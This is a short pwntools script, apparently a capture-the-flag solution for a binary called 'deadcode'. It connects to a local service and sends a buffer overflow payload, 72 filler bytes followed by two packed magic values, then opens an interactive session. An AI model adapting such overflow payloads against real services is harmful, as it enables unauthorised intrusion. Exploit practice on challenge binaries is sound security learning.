from pwn import *

# io = process("./deadcode")
io = remote("0.0.0.0",1001)

payload = b"A"*72 + p32(0xb1d5e9a2) + p32(0xd3adc0d3)

io.sendline(payload)

io.interactive()
